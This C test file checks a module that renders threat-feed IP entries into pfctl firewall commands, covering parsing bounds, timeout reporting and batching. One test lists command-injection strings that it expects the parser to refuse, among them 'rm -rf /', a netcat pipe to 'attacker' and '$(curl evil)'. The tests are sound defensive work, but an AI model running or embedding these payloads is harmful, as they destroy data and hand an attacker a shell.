/*
 * Copyright (C) 2026 Optim Enterprises BV
 *
 * This is free software, licensed under the BSD 3-Clause License.
 *
 * Host tests for pf enforcement rendering (FreeBSD/OPNsense port of test_nft).
 *
 * The headline case is still injection, and it is asserted first in the most
 * hostile terms available: every element originates in a threat feed, and here
 * it ends up as an argv entry to `pfctl`. An argument is safer than a string
 * only if it cannot be mistaken for an option, so the "no leading dash" case is
 * asserted explicitly.
 *
 * The second theme is the pf divergence: pf has no per-element timeout. That is
 * a capability gap, and the failure this codebase keeps hitting is a value that
 * is correct within a bound and quietly means something else past it. So the
 * unsupported timeout is asserted to be REPORTABLE rather than dropped
 * silently -- a caller must be able to learn that per-element decay is not in
 * force.
 */

#include "../src/pf.h"

#include <stdio.h>
#include <string.h>

static int failures;
static int checks;

#define CHECK(cond, msg)                                                       \
	do {                                                                   \
		checks++;                                                      \
		if (!(cond)) {                                                 \
			failures++;                                            \
			fprintf(stderr, "FAIL %s:%d: %s\n", __FILE__,          \
			        __LINE__, (msg));                              \
		}                                                              \
	} while (0)

static const struct pf_target TGT = { "aisense_rep4", "aisense_rep6" };

/* ------------------------------------------------------- injection --- */

static void test_hostile_feed_entries_are_refused(void)
{
	const char *hostile[] = {
		"1.2.3.0/24; rm -rf /",
		"1.2.3.0/24 } pfctl -F all #",
		"1.2.3.0/24`reboot`",
		"1.2.3.0/24$(id)",
		"1.2.3.0/24 | nc attacker 1234",
		"1.2.3.0/24\nflush\n",
		"1.2.3.0/24, 0.0.0.0/0",
		"$(curl evil)/24",
		"-1.2.3.0/24",       /* leading dash: must never look like a flag */
		"--table-v4",        /* an attempted flag injection */
		"-T",                /* the verb slot */
		"1.2.3.0/24 -T flush",
		"../../etc/passwd",
		"1.2.3.0/24\r\nquit",
		"1.2.3.0/24;",
		"'1.2.3.0/24'",
		"\"1.2.3.0/24\"",
		"1.2.3.0/24\\",
		"0x7f000001/24",
		"1.2.3.0/24%00",
	};

	for (size_t i = 0; i < sizeof(hostile) / sizeof(hostile[0]); i++) {
		struct pf_elem e;
		enum pf_reject r = pf_elem_parse(hostile[i], 0, &e);
		CHECK(r != PF_OK, "hostile entry must be refused");
		if (r != PF_OK) {
			/* And refused for a reason about characters, not
			 * incidentally by a later parser. */
			CHECK(r == PF_REJECT_UNSAFE_CHARS ||
			      r == PF_REJECT_MALFORMED,
			      "refusal must cite characters or malformed input");
		}
	}
}

static void test_no_element_can_begin_with_a_dash(void)
{
	/* The concrete argv-safety property: a rendered element can never be
	 * read as a pfctl option by getopt. */
	struct pf_elem e;
	CHECK(pf_elem_parse("-1.1.1.1", 0, &e) == PF_REJECT_UNSAFE_CHARS,
	      "leading dash refused");
	CHECK(pf_elem_parse("1.1.1.1", 0, &e) == PF_OK, "plain addr ok");
	char buf[PF_ELEM_TEXT_MAX];
	size_t n = pf_elem_render(&e, buf, sizeof(buf));
	CHECK(n > 0 && buf[0] != '-', "rendered element not flag-like");
}

/* ------------------------------------------------------- parsing --- */

static void test_parse_accepts_and_computes_bounds(void)
{
	struct pf_elem e;

	CHECK(pf_elem_parse("192.0.2.0/24", 0, &e) == PF_OK, "v4 /24 ok");
	CHECK(e.family == 4 && e.prefix == 24, "v4 family/prefix");
	CHECK(pf_elem_parse("192.0.2.1", 0, &e) == PF_OK, "bare v4 = host route");
	CHECK(e.prefix == 32, "bare v4 is /32");

	CHECK(pf_elem_parse("2001:db8::/48", 0, &e) == PF_OK, "v6 /48 ok");
	CHECK(e.family == 6 && e.prefix == 48, "v6 family/prefix");
	CHECK(pf_elem_parse("2001:db8::1", 0, &e) == PF_OK, "bare v6");
	CHECK(e.prefix == 128, "bare v6 is /128");

	/* Both directions on the bounds: the value at the edge must be
	 * accepted and the one past it refused, or a bound is decorative. */
	CHECK(pf_elem_parse("10.0.0.0/16", 0, &e) == PF_OK, "v4 /16 exactly is ok");
	CHECK(pf_elem_parse("10.0.0.0/15", 0, &e) == PF_REJECT_TOO_BROAD,
	      "v4 /15 refused");
	CHECK(pf_elem_parse("10.0.0.0/32", 0, &e) == PF_OK, "v4 /32 ok");
	CHECK(pf_elem_parse("10.0.0.0/33", 0, &e) == PF_REJECT_PREFIX,
	      "v4 /33 refused");
	CHECK(pf_elem_parse("2001:db8::/32", 0, &e) == PF_OK, "v6 /32 exactly ok");
	CHECK(pf_elem_parse("2001:db8::/31", 0, &e) == PF_REJECT_TOO_BROAD,
	      "v6 /31 refused");
	CHECK(pf_elem_parse("2001:db8::/129", 0, &e) == PF_REJECT_PREFIX,
	      "v6 /129 refused");
}

static void test_host_bits_are_refused(void)
{
	struct pf_elem e;
	/* 10.1.2.3/24 could mean the host or the network; the readings differ
	 * by 255 addresses, so refuse rather than guess. Note the prefix must be
	 * within the allowed breadth to reach this check at all -- a /8 host-bit
	 * entry is refused as too broad first, which is why that case is
	 * asserted separately below. */
	CHECK(pf_elem_parse("10.1.2.3/24", 0, &e) == PF_REJECT_HOSTBITS,
	      "host bits below prefix refused");
	CHECK(pf_elem_parse("10.1.2.3/8", 0, &e) == PF_REJECT_TOO_BROAD,
	      "an over-broad entry is refused on breadth, checked before host bits");
	CHECK(pf_elem_parse("10.0.0.0/16", 0, &e) == PF_OK,
	      "clean /16 is at the breadth bound and accepted");
	CHECK(pf_elem_parse("192.0.2.128/25", 0, &e) == PF_OK,
	      "host bits above prefix are fine");
	CHECK(pf_elem_parse("2001:db8::1/48", 0, &e) == PF_REJECT_HOSTBITS,
	      "v6 host bits refused");
}

/* ------------------------------------------------------- the divergence --- */

static void test_per_element_timeout_is_reported_not_dropped(void)
{
	/*
	 * pf expresses decay per TABLE (`expire`), not per element. The
	 * danger is a caller passing a timeout, getting success, and believing
	 * entries will age out. So the parse carries the timeout and the
	 * representation status is observable.
	 */
	struct pf_elem e;
	enum pf_reject r = pf_elem_parse("192.0.2.0/24", 604800, &e);
	CHECK(r == PF_OK, "entry with a timeout still parses");
	CHECK(e.timeout_sec == 604800, "timeout is carried for bookkeeping");

	/* The rendered text must NOT contain nft `timeout` syntax, which
	 * pfctl would reject -- and must not silently pretend it applied. */
	char buf[PF_ELEM_TEXT_MAX];
	size_t n = pf_elem_render(&e, buf, sizeof(buf));
	CHECK(n > 0, "renders");
	CHECK(strstr(buf, "timeout") == NULL,
	      "no nft timeout keyword leaks into pfctl argument");
	CHECK(strcmp(buf, "192.0.2.0/24") == 0, "element text is bare CIDR");

	/* The status string names the gap, so a log or API can surface it. */
	CHECK(strcmp(pf_reject_str(PF_REJECT_TIMEOUT_UNSUPPORTED),
	             "per_element_timeout_unsupported") == 0,
	      "the gap has a name a caller can report");
}

static void test_table_decl_uses_the_opnsense_seam(void)
{
	char buf[1024];
	size_t n = pf_render_table_decl(&TGT, 3600, buf, sizeof(buf));
	CHECK(n > 0, "table decl renders");
	CHECK(strstr(buf, "static_aliases") != NULL,
	      "declaration points at the OPNsense seam");
	CHECK(strstr(buf, "\"type\": \"external\"") != NULL,
	      "declares an external table");
	CHECK(strstr(buf, "\"expire\": \"3600\"") != NULL,
	      "carries the expire that gives native decay");
	CHECK(strstr(buf, "aisense_rep4") != NULL, "names the table");

	/* expire 0 must render as 0, not be dropped: "no expiry" is a real
	 * choice and a caller must be able to state it. */
	n = pf_render_table_decl(&TGT, 0, buf, sizeof(buf));
	CHECK(n > 0 && strstr(buf, "\"expire\": \"0\"") != NULL,
	      "expire 0 is expressible");
}

/* ------------------------------------------------------- rendering --- */

static void test_render_routes_families_to_their_tables(void)
{
	struct pf_elem elems[3];
	CHECK(pf_elem_parse("192.0.2.0/24", 0, &elems[0]) == PF_OK, "p1");
	CHECK(pf_elem_parse("2001:db8::/48", 0, &elems[1]) == PF_OK, "p2");
	CHECK(pf_elem_parse("198.51.100.0/24", 0, &elems[2]) == PF_OK, "p3");

	char buf[1024];
	size_t done = 0;
	size_t n = pf_render_add(&TGT, elems, 3, buf, sizeof(buf), &done);
	CHECK(n > 0, "batch renders");
	CHECK(done == 3, "all three elements rendered");

	CHECK(strstr(buf, "pfctl -t aisense_rep4 -T add") != NULL,
	      "v4 invocations use the v4 table");
	CHECK(strstr(buf, "pfctl -t aisense_rep6 -T add") != NULL,
	      "v6 invocations use the v6 table");
	CHECK(strstr(buf, "192.0.2.0/24") != NULL, "v4 element present");
	CHECK(strstr(buf, "2001:db8::/48") != NULL, "v6 element present");

	/* The v4 table must not be handed a v6 address. */
	char *v4line = strstr(buf, "aisense_rep4");
	char *v6line = strstr(buf, "aisense_rep6");
	if (v4line && v6line) {
		char *v4end = strchr(v4line, '\n');
		if (v4end && v4line < v6line)
			CHECK(v4end <= v6line,
			      "v4 line ends before the v6 line starts");
		CHECK(strstr(v4line, "2001:db8") == NULL ||
		      (v4end && strstr(v4line, "2001:db8") > v4end),
		      "no v6 address on the v4 invocation");
	}
}

static void test_delete_verb_and_flush(void)
{
	struct pf_elem elems[1];
	CHECK(pf_elem_parse("192.0.2.0/24", 604800, &elems[0]) == PF_OK, "p");

	char buf[512];
	size_t done = 0;
	size_t n = pf_render_del(&TGT, elems, 1, buf, sizeof(buf), &done);
	CHECK(n > 0 && done == 1, "delete renders");
	CHECK(strstr(buf, "-T delete") != NULL, "delete uses the delete verb");
	/* nft rejects a timeout on delete; pf takes a bare address, and the
	 * nft-style suffix must not appear here either. */
	CHECK(strstr(buf, "timeout") == NULL, "no timeout on delete");
}

static void test_batch_is_bounded(void)
{
	/* More elements than one invocation should carry must render as a
	 * bounded batch, never a truncated one that reports full success. */
	static struct pf_elem elems[PF_BATCH_MAX + 10];
	for (size_t i = 0; i < PF_BATCH_MAX + 10; i++) {
		char t[32];
		snprintf(t, sizeof(t), "10.%u.%u.0/24", (unsigned)(i / 256),
		         (unsigned)(i % 256));
		if (pf_elem_parse(t, 0, &elems[i]) != PF_OK)
			elems[i].family = 0; /* skipped by the renderer */
	}
	static char buf[65536];
	size_t done = 0;
	size_t n = pf_render_add(&TGT, elems, PF_BATCH_MAX + 10, buf, sizeof(buf),
	                         &done);
	CHECK(n > 0, "oversized batch still renders");
	CHECK(done <= PF_BATCH_MAX, "rendered count respects the batch bound");
}

static void test_argc_and_argv_prefix(void)
{
	CHECK(pf_render_argc(&TGT, 3) == 5 + 3 + 1, "argc accounts for prefix, elements, NULL");
	CHECK(pf_render_argc(NULL, 3) == 0, "NULL target is not a size");

	const char *argv[5];
	CHECK(pf_render_argv_prefix(&TGT, false, true, argv, 5) == 5, "prefix len");
	CHECK(strcmp(argv[0], "pfctl") == 0, "argv[0] is pfctl");
	CHECK(strcmp(argv[1], "-t") == 0, "argv[1] is -t");
	CHECK(strcmp(argv[2], "aisense_rep4") == 0, "argv[2] is the v4 table");
	CHECK(strcmp(argv[3], "-T") == 0, "argv[3] is -T");
	CHECK(strcmp(argv[4], "add") == 0, "argv[4] is the verb");

	const char *argv6[5];
	CHECK(pf_render_argv_prefix(&TGT, true, false, argv6, 5) == 5, "v6 prefix len");
	CHECK(strcmp(argv6[2], "aisense_rep6") == 0, "v6 table");
	CHECK(strcmp(argv6[4], "delete") == 0, "delete verb");
}

static void test_null_and_zero_length_are_refused(void)
{
	struct pf_elem e;
	char buf[64];
	CHECK(pf_elem_parse(NULL, 0, &e) == PF_REJECT_MALFORMED, "NULL text");
	CHECK(pf_elem_parse("192.0.2.0/24", 0, NULL) == PF_REJECT_MALFORMED, "NULL out");
	CHECK(pf_elem_render(NULL, buf, sizeof(buf)) == 0, "NULL elem");
	CHECK(pf_elem_render(&e, NULL, sizeof(buf)) == 0, "NULL buf");
	CHECK(pf_elem_render(&e, buf, 0) == 0, "zero-length buf");
	CHECK(pf_render_add(NULL, &e, 1, buf, sizeof(buf), NULL) == 0, "NULL target");
}

/* ------------------------------------------------------- overflow --- */

static void test_small_buffer_reports_zero_not_partial(void)
{
	/* A buffer too small must report failure, so a caller detects a short
	 * write rather than shipping a truncated table. */
	struct pf_elem elems[2];
	CHECK(pf_elem_parse("192.0.2.0/24", 0, &elems[0]) == PF_OK, "p1");
	CHECK(pf_elem_parse("198.51.100.0/24", 0, &elems[1]) == PF_OK, "p2");

	char tiny[8];
	size_t done = 99;
	size_t n = pf_render_add(&TGT, elems, 2, tiny, sizeof(tiny), &done);
	CHECK(n == 0, "overflow reports 0 bytes");
	CHECK(done == 0, "overflow reports 0 rendered");

	char one[64];
	n = pf_render_add(&TGT, elems, 1, one, sizeof(one), &done);
	CHECK(n > 0 && done == 1, "a fitting batch still works");
}

int main(void)
{
	test_hostile_feed_entries_are_refused();
	test_no_element_can_begin_with_a_dash();
	test_parse_accepts_and_computes_bounds();
	test_host_bits_are_refused();
	test_per_element_timeout_is_reported_not_dropped();
	test_table_decl_uses_the_opnsense_seam();
	test_render_routes_families_to_their_tables();
	test_delete_verb_and_flush();
	test_batch_is_bounded();
	test_argc_and_argv_prefix();
	test_null_and_zero_length_are_refused();
	test_small_buffer_reports_zero_not_partial();

	printf("%d checks, %d failures\n", checks, failures);
	return failures == 0 ? 0 : 1;
}
